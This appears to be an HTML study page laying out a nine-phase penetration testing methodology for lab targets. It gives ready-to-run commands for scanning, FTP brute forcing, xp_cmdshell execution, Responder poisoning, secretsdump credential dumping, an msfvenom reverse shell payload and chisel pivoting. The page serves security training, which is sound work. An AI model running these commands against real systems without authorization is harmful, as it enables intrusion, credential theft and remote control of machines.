<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Penetration Testing Methodology</title>
    <style>
        :root {
            --bg-color: #f4f7f6;
            --text-color: #333;
            --sidebar-bg: #2c3e50;
            --sidebar-text: #ecf0f1;
            --accent-color: #3498db;
            --code-bg: #282c34;
            --code-text: #abb2bf;
            --phase1: #3498db;
            --phase2: #2ecc71;
            --phase3: #e67e22;
            --phase4: #9b59b6;
            --phase5: #e74c3c;
            --phase6: #1abc9c;
            --phase7: #f1c40f;
            --phase8: #d35400;
            --phase9: #7f8c8d;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            line-height: 1.6;
            color: var(--text-color);
            background-color: var(--bg-color);
            margin: 0;
            display: flex;
        }

        /* Sidebar Navigation */
        nav {
            width: 280px;
            background: var(--sidebar-bg);
            color: var(--sidebar-text);
            height: 100vh;
            position: sticky;
            top: 0;
            padding: 20px;
            overflow-y: auto;
            box-sizing: border-box;
            box-shadow: 2px 0 5px rgba(0,0,0,0.1);
        }

        nav h2 {
            font-size: 1.2rem;
            margin-bottom: 20px;
            border-bottom: 1px solid #455a64;
            padding-bottom: 10px;
            color: var(--accent-color);
        }

        nav ul {
            list-style: none;
            padding: 0;
        }

        nav ul li {
            margin-bottom: 10px;
        }

        nav ul li a {
            color: var(--sidebar-text);
            text-decoration: none;
            font-size: 0.9rem;
            transition: color 0.2s;
            display: block;
            padding: 5px 0;
        }

        nav ul li a:hover {
            color: var(--accent-color);
        }

        /* Main Content */
        main {
            flex: 1;
            padding: 40px;
            max-width: 1000px;
            margin: 0 auto;
        }

        .container {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
        }

        h1 {
            color: var(--sidebar-bg);
            border-bottom: 3px solid var(--accent-color);
            padding-bottom: 10px;
            margin-top: 0;
        }

        h2 {
            margin-top: 40px;
            padding: 10px 15px;
            border-radius: 4px;
            color: white;
            background: var(--sidebar-bg);
        }

        /* Phase Specific Colors */
        #phase-1-preparation-setup { background-color: var(--phase1); }
        #phase-2-network-enumeration-the-map { background-color: var(--phase2); }
        #phase-3-service-footprinting-attacks { background-color: var(--phase3); }
        #phase-4-web-enumeration-the-deep-dive { background-color: var(--phase4); }
        #phase-5-active-directory-enumeration-attacks { background-color: var(--phase5); }
        #phase-6-exploitation-shells { background-color: var(--phase6); }
        #phase-7-post-exploitation-pivoting { background-color: var(--phase7); color: #333; }
        #phase-8-privilege-escalation { background-color: var(--phase8); }
        #phase-9-reporting { background-color: var(--phase9); }

        h3 {
            color: var(--sidebar-bg);
            border-left: 4px solid var(--accent-color);
            padding-left: 10px;
            margin-top: 30px;
        }

        blockquote {
            background: #eef2f3;
            border-left: 5px solid var(--accent-color);
            padding: 15px 20px;
            margin: 20px 0;
            font-style: italic;
        }

        code {
            background: #f0f0f0;
            padding: 2px 5px;
            border-radius: 3px;
            font-family: 'Fira Code', 'Courier New', monospace;
            font-size: 0.9em;
            color: #d63384;
        }

        pre {
            background: var(--code-bg);
            color: var(--code-text);
            padding: 20px;
            border-radius: 6px;
            overflow-x: auto;
            position: relative;
        }

        pre code {
            background: transparent;
            color: inherit;
            padding: 0;
        }

        .sourceCode {
            margin: 1.5em 0;
        }

        /* Responsive */
        @media (max-width: 900px) {
            body { flex-direction: column; }
            nav { width: 100%; height: auto; position: relative; }
            main { padding: 20px; }
            .container { padding: 20px; }
        }

        hr {
            border: 0;
            height: 1px;
            background: #ddd;
            margin: 40px 0;
        }

        ul li {
            margin-bottom: 8px;
        }

        strong {
            color: #2c3e50;
        }

    </style>
</head>
<body>

<nav>
    <h2>Methodology</h2>
    <ul>
        <li><a href="#phase-1-preparation-setup">Phase 1: Prep &amp; Setup</a></li>
        <li><a href="#phase-2-network-enumeration-the-map">Phase 2: Network Enum</a></li>
        <li><a href="#phase-3-service-footprinting-attacks">Phase 3: Service Attacks</a></li>
        <li><a href="#phase-4-web-enumeration-the-deep-dive">Phase 4: Web Enum</a></li>
        <li><a href="#phase-5-active-directory-enumeration-attacks">Phase 5: AD Attacks</a></li>
        <li><a href="#phase-6-exploitation-shells">Phase 6: Exploitation</a></li>
        <li><a href="#phase-7-post-exploitation-pivoting">Phase 7: Post-Exploit</a></li>
        <li><a href="#phase-8-privilege-escalation">Phase 8: PrivEsc</a></li>
        <li><a href="#phase-9-reporting">Phase 9: Reporting</a></li>
    </ul>
</nav>

<main>
    <div class="container">
        <h1 id="comprehensive-penetration-testing-methodology">Comprehensive Penetration Testing Methodology</h1>
        
        <p>This methodology is a rigorous, step-by-step guide synthesized from the CPTS notes and industry best practices. It allows for a repeatable, structured assessment of target systems, ensuring no stone is left unturned.</p>

        <blockquote>
            <p><strong>Core Philosophy:</strong> “Distinguish between what we see and what we do not see. There are always ways to gain more information.”</p>
        </blockquote>

        <hr />

        <h2 id="phase-1-preparation-setup">Phase 1: Preparation &amp; Setup</h2>
        <p>Before engaging the target, ensure your environment is optimized for data capture and multitasking.</p>

        <h3 id="workspace-organization">1. Workspace Organization</h3>
        <ul>
            <li><strong>Directory Structure:</strong>
                <div class="sourceCode"><pre><code>mkdir -p {target_name}/{nmap,scans,exploits,loot,notes,downloads}
cd {target_name}</code></pre></div>
            </li>
            <li><strong>Session Management:</strong> Use <code>tmux</code> or <code>terminator</code> to manage multiple terminal windows (VPN, Listeners, Scans).</li>
            <li><strong>Variables:</strong> Export target IP for easy reference: <code>export IP=10.129.x.x</code></li>
        </ul>

        <h3 id="mental-model-the-layers">2. Mental Model (The Layers)</h3>
        <p>Visualize the target in layers: 
            <ol>
                <li><strong>External:</strong> Domains, Subdomains, ASN.</li>
                <li><strong>Perimeter:</strong> Firewalls, IDS/IPS, VPN endpoints.</li>
                <li><strong>Services:</strong> Ports, Versions, Applications.</li>
                <li><strong>Internal:</strong> Active Directory, Trusts, Internal Networks.</li>
                <li><strong>Host:</strong> OS, Processes, Filesystem, Secrets.</li>
            </ol>
        </p>

        <hr />

        <h2 id="phase-2-network-enumeration-the-map">Phase 2: Network Enumeration (The Map)</h2>
        <p>Use <strong>Nmap</strong> to map the attack surface.</p>

        <h3 id="host-discovery">1. Host Discovery</h3>
        <p>Identify live hosts.</p>
        <div class="sourceCode"><pre><code># Ping Sweep (Local/VPN)
sudo nmap -sn 10.129.2.0/24 -oA scans/discovery

# FPing (Fast)
fping -asgq 10.129.2.0/24</code></pre></div>

        <h3 id="port-scanning">2. Port Scanning</h3>
        <p>Identify open “doors”.</p>
        <ul>
            <li><strong>Quick Scan (Top 1000):</strong> <code>sudo nmap $IP --top-ports=1000 --open</code></li>
            <li><strong>Full TCP Scan (The Standard):</strong>
                <div class="sourceCode"><pre><code>sudo nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn $IP -oA scans/allports</code></pre></div>
            </li>
            <li><strong>UDP Scan (Don’t Skip):</strong>
                <div class="sourceCode"><pre><code>sudo nmap -sU -F --top-ports 100 $IP -oA scans/udp_scan</code></pre></div>
            </li>
        </ul>

        <h3 id="service-os-detection">3. Service &amp; OS Detection</h3>
        <p>Fingerprint the services on open ports.</p>
        <div class="sourceCode"><pre><code># Extract ports from allports.nmap
ports=$(grep open scans/allports.nmap | awk -F/ '{print $1}' | tr '\n' ',' | sed 's/,$//')

# Deep Scan
sudo nmap -sC -sV -p $ports $IP -oA scans/detailed</code></pre></div>

        <hr />

        <h2 id="phase-3-service-footprinting-attacks">Phase 3: Service Footprinting &amp; Attacks</h2>
        <p>Deep dive into every open port.</p>

        <h3 id="ftp-21">FTP (21)</h3>
        <ul>
            <li><strong>Anonymous Login:</strong> <code>wget -m --no-passive ftp://anonymous:anonymous@$IP</code></li>
            <li><strong>Brute Force:</strong> <code>hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://$IP</code></li>
        </ul>

        <h3 id="ssh-22">SSH (22)</h3>
        <ul>
            <li><strong>Banner Grabbing:</strong> <code>nc -nv $IP 22</code></li>
            <li><strong>Key Permissions:</strong> <code>chmod 600 id_rsa</code></li>
            <li><strong>User Enumeration:</strong> <code>nmap -p22 --script ssh-auth-methods $IP</code></li>
        </ul>

        <h3 id="smb-139445">SMB (139/445)</h3>
        <ul>
            <li><strong>Enumeration:</strong>
                <div class="sourceCode"><pre><code>smbclient -N -L //$IP
smbmap -H $IP
enum4linux-ng.py $IP -A
crackmapexec smb $IP --shares -u '' -p ''</code></pre></div>
            </li>
        </ul>

        <h3 id="databases">Databases</h3>
        <ul>
            <li><strong>MySQL (3306):</strong> <code>mysql -u root -p -h $IP</code></li>
            <li><strong>MSSQL (1433):</strong>
                <div class="sourceCode"><pre><code>impacket-mssqlclient User:Pass@$IP -windows-auth
# Check for xp_cmdshell
SQL&gt; enable_xp_cmdshell
SQL&gt; xp_cmdshell whoami</code></pre></div>
            </li>
        </ul>

        <hr />

        <h2 id="phase-4-web-enumeration-the-deep-dive">Phase 4: Web Enumeration (The Deep Dive)</h2>
        <p>If HTTP/HTTPS is present, it is often the primary vector.</p>

        <h3 id="reconnaissance">1. Reconnaissance</h3>
        <ul>
            <li><strong>Tech Stack:</strong> <code>whatweb $IP</code></li>
            <li><strong>Headers:</strong> <code>curl -I http://$IP</code></li>
        </ul>

        <h3 id="vhost-subdomain-discovery">2. VHost &amp; Subdomain Discovery</h3>
        <div class="sourceCode"><pre><code># VHost Fuzzing
ffuf -u http://$IP -H "Host: FUZZ.domain.htb" -w subdomains.txt -fs [size]

# Directory Fuzzing
ffuf -u http://$IP/FUZZ -w common.txt -e .php,.txt,.html</code></pre></div>

        <hr />

        <h2 id="phase-5-active-directory-enumeration-attacks">Phase 5: Active Directory Enumeration &amp; Attacks</h2>
        <p>If connected to a domain environment.</p>

        <h3 id="initial-enumeration-no-creds">1. Initial Enumeration (No Creds)</h3>
        <ul>
            <li><strong>Responder:</strong> <code>sudo responder -I tun0 -dwv</code></li>
            <li><strong>Kerbrute:</strong> <code>kerbrute userenum -d domain.local --dc $IP users.txt</code></li>
        </ul>

        <h3 id="credentialed-enumeration">2. Credentialed Enumeration</h3>
        <ul>
            <li><strong>Bloodhound:</strong> <code>bloodhound-python -u 'user' -p 'pass' -ns $IP -d domain.local -c all</code></li>
            <li><strong>SecretsDump:</strong> <code>impacket-secretsdump domain/user:pass@$IP</code></li>
        </ul>

        <hr />

        <h2 id="phase-6-exploitation-shells">Phase 6: Exploitation &amp; Shells</h2>
        
        <h3 id="payload-crafting-msfvenom">1. Payload Crafting (MSFVenom)</h3>
        <div class="sourceCode"><pre><code># Windows Reverse Shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe</code></pre></div>

        <h3 id="shell-stabilization-linux">2. Shell Stabilization (Linux)</h3>
        <div class="sourceCode"><pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm</code></pre></div>

        <hr />

        <h2 id="phase-7-post-exploitation-pivoting">Phase 7: Post-Exploitation &amp; Pivoting</h2>
        <h3 id="pivoting-the-tunnels">1. Pivoting</h3>
        <ul>
            <li><strong>SSH SOCKS:</strong> <code>ssh -D 9050 user@pivot</code></li>
            <li><strong>Chisel:</strong> <code>./chisel client $LHOST:8000 R:socks</code></li>
        </ul>

        <hr />

        <h2 id="phase-8-privilege-escalation">Phase 8: Privilege Escalation</h2>
        <h3 id="linux-privesc">1. Linux PrivEsc</h3>
        <ul>
            <li><strong>Sudo:</strong> <code>sudo -l</code></li>
            <li><strong>SUID:</strong> <code>find / -perm -4000 2&gt;/dev/null</code></li>
            <li><strong>Automated:</strong> <code>linpeas.sh</code></li>
        </ul>

        <h3 id="windows-privesc">2. Windows PrivEsc</h3>
        <ul>
            <li><strong>Privs:</strong> <code>whoami /priv</code></li>
            <li><strong>Automated:</strong> <code>winPEASx64.exe</code></li>
        </ul>

        <hr />

        <h2 id="phase-9-reporting">Phase 9: Reporting</h2>
        <ul>
            <li><strong>Documentation:</strong> Screenshot every flag immediately.</li>
            <li><strong>Cleanup:</strong> Remove all uploaded tools and shells.</li>
        </ul>
    </div>
</main>

</body>
</html>